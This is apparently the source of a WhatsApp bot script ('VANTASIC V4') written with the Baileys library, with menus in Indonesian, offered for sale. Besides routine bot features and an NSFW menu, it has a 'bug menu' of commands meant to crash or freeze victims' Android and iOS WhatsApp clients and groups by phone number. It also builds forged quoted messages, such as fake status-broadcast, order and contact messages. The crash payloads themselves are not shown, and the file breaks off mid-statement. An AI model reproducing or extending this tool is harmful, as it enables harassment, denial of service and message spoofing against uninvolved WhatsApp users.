/*
© Depayyy
*/
require('../config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const JsConfuser = require("js-confuser");
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const { Client } = require('ssh2');
const crypto = require('crypto');
const cheerio = require('cheerio');
const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')


module.exports = Ikyy = async (Ikyy, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
        
        const sender = m.key.fromMe ? Ikyy.user.id.split(":")[0] + "@s.whatsapp.net" || Ikyy.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa

        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./Connection/database/premium.json"))
        const reseller = JSON.parse(fs.readFileSync("./Connection/database/reseller.json"))
        const contacts = JSON.parse(fs.readFileSync("./Connection/database/ctcs.json"))
        const unli = JSON.parse(fs.readFileSync("./Connection/database/unli.json"))
        const ownerbot = JSON.parse(fs.readFileSync("./Connection/database/owner.json"))
        const isOwner = ownerbot.includes(sender)
        const isUnli = unli.includes(m.chat)
        const botNumber = await Ikyy.decodeJid(Ikyy.user.id);
        const isPremium = premium.includes(m.sender)
        const isReseller = reseller.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...ownerbot, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await Ikyy.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;        
        const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, capital } = require('../Connection/myfunction');
 
// FOTO
const nika = fs.readFileSync('./Connection/poto/depay.jpg')
const img = fs.readFileSync('./Connection/poto/nika.jpg')
const musik = fs.readFileSync('./Connection/poto/lagu.mp3')
 const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../Connection/database/exif')      
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   ⌬ Grup: ${groupName} \n` +
                        `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        const reaction = async (jidss, emoji) => {
            Ikyy.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };

//=================================================//
const NomerDepay =
[
'6285220324232@s.whatsapp.net'
] 
//=================================================//

//=================================================//
     /// CONST HARI INI ///
//=================================================//
/*
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning 🌆";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon 🌇";
  } else {
    return "Good Night 🌌";
  }
}
*/
//const greeting = getGreeting();
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
}
if(time2 < "18:00:00"){
var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
}
if(time2 < "15:00:00"){
var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
}
if(time2 < "10:00:00"){
var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
}
if(time2 < "05:00:00"){
var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
}
if(time2 < "03:00:00"){
var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
}

const example = (teks) => {
return `\n *Cara Penggunaan Command :*\n *${prefix+command}* ${teks}\n`
}
//============================================//    
 /// QUOTED MENU ///
//============================================//            
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂`,
'vcard': `BEGIN:VCARD\nVERSION:4.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285890691381:6285890691381\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net", 
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2008",
      thumbnail: img,
      itemCount: "13",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂\n© 𝐕𝟒`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const Ikyybut = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `Vantasic-Ai`},
    nativeFlowMessage: {
      buttons: [{text: "Ikyy"}
           ],
    }
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `VANTASIC - AI`}}})
 Ikyy.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}
///============================================//    
 /// REPLY TEXT ///
//============================================//     
async function payreply12(teks) {
const Shen = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `Ikyyy Official`,
newsletterJid: `120363421408982445@newsletter`,
},
externalAdReply: {  
showAdAttribution: true,
title: `VANTASIC VERSION 4`,
body: '© Ikyyy Official',
thumbnailUrl: `https://files.catbox.moe/x4xfvx.jpg`,
sourceUrl: 'depay.com',
},
},
text: teks,
}
return Ikyy.sendMessage(m.chat, Shen, {
quoted: m,
})
}

 async function payreplybug(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363421408982445@newsletter",
newsletterName: `Ikyy Official`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© Ikyyy Official`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: `https://files.catbox.moe/mz0q1d.jpeg` } }, { upload: Ikyy.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Developer Information\",\"url\":\"https://whatsapp.com/channel/0029Vb7OLHODuMRXTZVu8d2a\",\"merchant_url\":\"https://www.google.com\"}`
}],
}), })}
}}, {quoted: lol})
await Ikyy.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

 async function payreply(teks) {
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© Ikyy Official"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Developer Information\",\"url\":\"https://whatsapp.com/channel/0029Vb7OLHODuMRXTZVu8d2a\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: lol}) 
await Ikyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}  

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
async function MenuJir(chat, teks, mek, lol) {
  try {
    const msg = generateWAMessageFromContent(
      chat,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
              contextInfo: {
                forwardingScore: 999999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363421408982445@newsletter",
                  newsletterName: `Ikyy Official`,
                  serverMessageId: 145,
                },
              },
              body: proto.Message.InteractiveMessage.Body.create({
                text: teks,
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: `© Ikyyy Official`,
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                title: "",
                subtitle: "",
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                  { image: { url: "https://files.catbox.moe/8bruf5.jpeg" } },
                  { upload: Ikyy.waUploadToServer }
                )),
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify(mek),
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: `{"display_text":"Developer Information","url":"https://whatsapp.com/channel/0029Vb7OLHODuMRXTZVu8d2a"}`,
                  },
                ],
              }),
            }),
          },
        },
      },
      { quoted: lol }
    );
    await Ikyy.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

    await delay(2000); // 2 detik, ubah sesuai keinginan

    await Ikyy.sendMessage(
      chat,
      {
        audio: fs.readFileSync("./Connection/poto/lagu.mp3"),
        mimetype: "audio/mpeg",
        ptt: true,
      },
      { quoted: qkontak }
    );
      } catch (e) {
    console.error("Error jink:", e);
  }
}


//=================================================//
     /// COMANDD ///
//=================================================// 
        switch (command) {
        case "menu": {
   await Ikyy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}});
       let teks =`— ( 🕸 ) Здравствуйте, я бот WhatsApp, созданный IkyyOfficial, чтобы помочь вам.

 [ 𝗡𝗜𝗞𝗔 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]
⌬ Creator : IkyyOfficial
⌬ BotName : VANTASIC
⌬ Telegram : t.me/IkyyLoww
⌬ Version : 4.0.0
⌬ Action : ẉ.ceo/IkyyNotDev
⌬ Status : *${Ikyy.public ? "Public" : "Self"}*
⌬ Runtime : *${runtime(process.uptime())}*

[!] *List - Menu*
 .𝚊𝚕𝚕𝚖𝚎𝚗𝚞 *Lihat semua menu*
 .𝚋𝚞𝚐𝚖𝚎𝚗𝚞 *Lihat semua bugmenu*
`
  const betton = {
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "VANTASIC V3",
                        url: "t.me/IkyyLoww",
                        copy_code: "Vantasic VIP",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "VantasicXIkyyloww",
                        button_title: "▸ ☭ ◂"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/IkyyLoww",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "depzy",
                            sections: [
                                {
                                    title: "# X - the best",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "PRODUK", 
                                            description: "Melihatkan All Produk",
                                            id: ".produk"
                                        },
                                        { 
                                            title: "Back Menu",
                                            description: "Kembali Kemenu awal",
                                            id: ".menu"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ikyyoffc",
                            id: "123456789",
                            copy_code: "https://t.me/IkyyLoww"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "credit",
                            id: `${prefix}thanks`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "buy script",
                            id: `${prefix}buysc`
                        })
                    }
                ]
            }
        }
    MenuJir(m.chat, teks, betton, lol)
}
break

        case "allmenu": {
   await Ikyy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}});
       let teks =`— ( 🕸 ) Здравствуйте, я бот WhatsApp, созданный IkyyOfficial, чтобы помочь вам.

 [ 𝗡𝗜𝗞𝗔 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]
⌬ Creator : IkyyOfficial
⌬ BotName : VANTASIC
⌬ Telegram : t.me/IkyyLoww
⌬ Version : 4.0.0
⌬ Action : ẉ.ceo/IkyyNotDev
⌬ Status : *${Ikyy.public ? "Public" : "Self"}*
⌬ Runtime : *${runtime(process.uptime())}*

[!] *Owner - Fiture*
  .𝚊𝚍𝚍𝚘𝚠𝚗𝚎𝚛
  .𝚍𝚎𝚕𝚘𝚠𝚗𝚎𝚛
  .𝚊𝚍𝚍𝚖𝚞𝚛𝚋𝚞𝚐
  .𝚍𝚎𝚕𝚖𝚞𝚛𝚋𝚞𝚐
  .𝚜𝚎𝚕𝚏
  .𝚙𝚞𝚋𝚕𝚒𝚌
  .𝚛𝚎𝚜𝚝𝚊𝚛𝚝
  .𝚑𝚒𝚍𝚎𝚝𝚊𝚐  

[!] *Menu - Fiture*
  .𝚌𝚎𝚔𝚔𝚑𝚘𝚍𝚊𝚖
  .𝚌𝚎𝚔𝚔𝚘𝚗𝚝𝚘𝚕
  .𝚌𝚎𝚔𝚒𝚍𝚌𝚑
  .𝚜𝚝𝚒𝚔𝚎𝚛
  .𝚝𝚒𝚔𝚝𝚘𝚔
  .𝚙𝚕𝚊𝚢
  .𝚋𝚘𝚌𝚒𝚕𝚠𝚒𝚗𝚍𝚊𝚑
  .𝚒𝚚𝚌
  .𝚋𝚛𝚊𝚝
  .𝚐𝚎𝚝𝚌𝚘𝚍𝚎
  .𝚝𝚘𝚞𝚛𝚕
  .𝚌𝚎𝚔𝚐𝚊𝚗𝚝𝚎𝚗𝚐
  .𝚝𝚛𝚊𝚌𝚔𝚒𝚙
  .𝚚𝚞𝚘𝚝𝚎𝚜𝚐𝚊𝚕𝚊𝚞
  .𝚗𝚒𝚔𝚊 ( 𝙰𝚒 ) 
  .𝚜𝚎𝚛𝚝𝚒𝚏𝚒𝚔𝚊𝚝𝚝𝚘𝚕𝚘𝚕
  .𝚖𝚞𝚜𝚕𝚒𝚖𝚊𝚒
  .𝚔𝚒𝚜𝚊𝚑𝚗𝚊𝚋𝚒
  .𝚚𝚌
  .𝚜𝚠𝚐𝚛𝚞𝚙
  .𝚌𝚘𝚍𝚒𝚗𝚐 ( 𝙰𝚒 )
  .𝚒𝚐
    
[!] *Panel - Fiture*
  .1𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .2𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .3𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .4𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .5𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .6𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .7𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .8𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*              
  .9𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .10𝚐𝚋 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .𝚞𝚗𝚕𝚒 *𝚄𝚜𝚎𝚛 𝙽𝚊𝚖𝚎*
  .𝚌𝚊𝚍𝚖𝚒𝚗 *𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎*
  .𝚍𝚎𝚕𝚙𝚊𝚗𝚎𝚕
  .𝚍𝚎𝚕𝚊𝚍𝚖𝚒𝚗
  .𝚕𝚒𝚜𝚝𝚙𝚊𝚗𝚎𝚕
  .𝚕𝚒𝚜𝚝𝚊𝚍𝚖𝚒𝚗
  .𝚊𝚍𝚍𝚛𝚎𝚜 
  .𝚍𝚎𝚕𝚛𝚎𝚜

[!] *Nsfw - Fiture*  
  .𝚗𝚜𝚏𝚠
  .𝚊𝚜𝚞𝚙𝚊𝚗
  .𝚑𝚎𝚗𝚝𝚊𝚒
  .18+

`
  const betton = {
    title: "𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂 - 𝐕𝟒",
    sections: [
      {
        title: `𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂`, 
        highlight_label: `© Ikyy Official`,
        rows: [
          {
            title: "𝑩𝒖𝒈 𝑴𝒆𝒏𝒖",
            description: "Bug Menu",
            id: `.bugmenu`, 
          },
        ]},
      {
        title: `𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂`, 
        highlight_label: `© Ikyy Official`,
        rows: [
          {
            title: "𝑨𝒍𝒍 𝑴𝒆𝒏𝒖",
            description: "Menu", 
            id: `.all menu`,                 
          },
        ]},
      {
        title: `𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂`, 
        highlight_label: `© Ikyy Official`,
        rows: [
          {
            title: "𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐",
            description: "Credits", 
            id: `.tqto`,     
          },
        ]},
    ]}
    MenuJir(m.chat, teks, betton, lol)
}
break

case 'bugmenu': {
   await Ikyy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}});
let name = m.pushName || Ikyy.getName(m.sender);
let pan = `*𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂 𝐕𝟒*

[!] Informasi Penggunaan -
Gunakan Script Ini dengan bijak, jangan salah gunakan script ini untuk hal hal yang merugikan, semoga bermanfaat -
`;
const url = "https://files.catbox.moe/dgf7bs.jpeg";
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Ikyy.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/dgf7bs.jpeg" } }, { upload: Ikyy.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'Bug Menu',
          hasMediaAttachment: false
        }),
                body: {
                  text: `[ 𝗔𝗡𝗗𝗥𝗢 𝗖𝗥𝗔𝗦𝗛𝗘𝗗 ]
ᛃ .𝚌𝚊𝚕𝚕-𝚌𝚛𝚊𝚜𝚑 *628𝚡𝚡𝚡*
ᛃ .𝚒𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎-𝚍𝚎𝚕𝚊𝚢 *628𝚡𝚡𝚡*
ᛃ .𝚌𝚛𝚊𝚜𝚑-𝚋𝚎𝚝𝚊 *628𝚡𝚡𝚡*
ᛃ .𝚏𝚌-𝚞𝚒 *628𝚡𝚡𝚡*
ᛃ .𝚌𝚘𝚖𝚋𝚘-𝚍𝚎𝚕𝚊𝚢 *628𝚡𝚡𝚡*
`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Developer Information","url":"https://whatsapp.com/channel/0029Vb7OLHODuMRXTZVu8d2a","merchant_url":"https://t.me/depaygantengbjirr"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/dgf7bs.jpeg" } }, { upload: Ikyy.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'Bug Menu',
          hasMediaAttachment: false
        }),
                body: {
                  text: `[ 𝗜𝗢𝗦 𝗖𝗥𝗔𝗦𝗛𝗘𝗗 ]
ᛃ .𝚒𝚗𝚟𝚒𝚜-𝚒𝚘𝚜 *628𝚡𝚡𝚡*
ᛃ .𝚋𝚕𝚊𝚗𝚔-𝚒𝚘𝚜 *628𝚡𝚡𝚡*
ᛃ .𝚌𝚛𝚊𝚜𝚑-𝚒𝚘𝚜 *628𝚡𝚡𝚡*

[ 𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣 ]
ᛃ .𝚋𝚕𝚊𝚗𝚔𝚐𝚋 [ 𝚒𝚗𝚙𝚕𝚊𝚌𝚎 ]
ᛃ .𝚔𝚒𝚕𝚕𝚐𝚋 [ 𝚒𝚗𝚙𝚕𝚊𝚌𝚎 ]
ᛃ .𝚋𝚞𝚐𝚐𝚋 [ 𝚒𝚗𝚙𝚕𝚊𝚌𝚎 ]
`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Developer Information","url":"https://whatsapp.com/channel/0029Vb7OLHODuMRXTZVu8d2a","merchant_url":"https://whatsapp.com/channel/0029Vb7OLHODuMRXTZVu8d2a"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
      { quoted: lol }
);

await Ikyy.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break;

case "owner": {

  let namaown = `Ikyy Official`
  let NoOwn = `6285220324232`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:4.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:IkyOfficial\nX-WA-BIZ-NAME:[[IkyyMods]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: qkontak
  })
  Ikyy.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;

case 'tqto': {

await Ikyy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let teks = ` 〘 Thanks To Support 〙
IkyyOffc ( Developer ) 
Aerin ( MyLove ) 
Kayzen
Dilan
Coganz
Melvin
Kazura
Kenzy
Yuda
`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© Ikyy Official"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Developer Information\",\"url\":\"https://whatsapp.com/channel/0029Vb7OLHODuMRXTZVu8d2a\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qkontak}) 
await Ikyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
